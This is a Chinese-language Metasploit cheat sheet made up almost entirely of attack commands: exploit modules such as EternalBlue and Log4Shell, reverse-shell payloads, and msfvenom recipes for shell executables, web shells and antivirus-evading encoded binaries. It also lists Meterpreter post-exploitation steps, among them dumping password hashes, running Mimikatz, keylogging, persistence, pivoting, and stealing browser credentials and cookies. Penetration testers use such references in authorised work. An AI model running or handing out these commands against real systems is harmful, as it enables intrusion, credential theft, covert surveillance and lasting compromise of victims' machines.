# Metasploit 速查手册

## 基础操作

```bash
# 启动
msfconsole

# 数据库初始化
msfdb init
msfconsole -q
db_status
```

## 搜索模块

```bash
search type:exploit name:eternalblue
search type:exploit platform:windows cve:2021
search type:auxiliary name:smb
search type:post platform:linux

# 关键字搜索
search apache struts
search ms17-010
search log4j
```

## 使用模块

```bash
use exploit/windows/smb/ms17_010_eternalblue
info                         # 查看模块详情
show options                 # 查看参数
show targets                 # 查看目标类型
show payloads                # 查看可用 payload

set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444

check                        # 检查是否存在漏洞（部分模块支持）
exploit                      # 执行利用
run                          # 同 exploit
exploit -j                   # 后台运行
```

## 常用 Payload

```bash
# Meterpreter（功能最强）
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Shell
set PAYLOAD windows/x64/shell_reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp

# Web Payload
set PAYLOAD php/meterpreter/reverse_tcp
set PAYLOAD java/meterpreter/reverse_tcp
set PAYLOAD python/meterpreter/reverse_tcp
```

## Meterpreter 命令

```bash
# 系统信息
sysinfo
getuid
getpid

# 文件操作
ls
cd /path
cat /etc/passwd
download /etc/shadow /tmp/shadow
upload /local/file /remote/path

# 进程
ps
migrate PID                  # 迁移进程
kill PID

# 网络
ifconfig / ipconfig
route
portfwd add -l 8080 -p 80 -r 10.0.0.1    # 端口转发
arp

# 提权
getsystem                   # Windows 自动提权
run post/multi/recon/local_exploit_suggester

# 凭证
hashdump                    # Windows SAM hash
load kiwi                   # Mimikatz
creds_all
kerberos_ticket_list

# 持久化
run persistence -U -i 10 -p 4444 -r LHOST

# 横向移动
run post/windows/gather/enum_domain
run post/multi/gather/ping_sweep RHOSTS=10.0.0.0/24

# 截屏/键盘
screenshot
keyscan_start
keyscan_dump

# Pivot
run autoroute -s 10.0.0.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

## 常用 Auxiliary 模块

```bash
# 扫描
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/http/http_version
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/vnc/vnc_none_auth

# 爆破
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/smb/smb_login
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mssql/mssql_login

# 枚举
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/snmp/snmp_enum
```

## 常用 Exploit 模块

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue          # MS17-010
exploit/windows/smb/ms08_067_netapi               # MS08-067
exploit/windows/http/rejetto_hfs_exec              # HFS RCE
exploit/windows/local/ms16_032_secondary_logon_handle_privesc

# Linux
exploit/linux/samba/is_known_pipename              # SambaCry
exploit/linux/http/apache_mod_cgi_bash_env_exec    # ShellShock
exploit/multi/http/log4shell_header_injection       # Log4Shell

# Web
exploit/multi/http/struts2_content_type_ognl       # Struts2
exploit/multi/http/tomcat_mgr_upload                # Tomcat
exploit/unix/webapp/drupal_drupalgeddon2            # Drupal
exploit/multi/http/jenkins_script_console            # Jenkins
```

## Payload 生成（msfvenom）

```bash
# Windows 反弹 Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux 反弹 Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Web Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp

# Python 反弹
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py

# 免杀编码
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f python
```

## Handler 监听

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

## 后渗透模块

```bash
# 信息收集
post/multi/recon/local_exploit_suggester    # 提权建议
post/windows/gather/enum_applications       # 已安装软件
post/windows/gather/enum_logged_on_users    # 登录用户
post/linux/gather/enum_system               # Linux 系统信息
post/linux/gather/enum_network              # 网络信息

# 凭证收集
post/windows/gather/credentials/credential_collector
post/windows/gather/smart_hashdump
post/multi/gather/firefox_creds
post/multi/gather/chrome_cookies

# 内网
post/multi/gather/ping_sweep
post/windows/gather/arp_scanner
post/windows/manage/autoroute
```

## 数据库操作

```bash
hosts                      # 查看已发现主机
services                   # 查看已发现服务
vulns                      # 查看已发现漏洞
creds                      # 查看已获取凭证
loot                       # 查看收集的数据

db_nmap -sV TARGET         # nmap 结果自动入库
db_import nmap.xml         # 导入 nmap XML
```
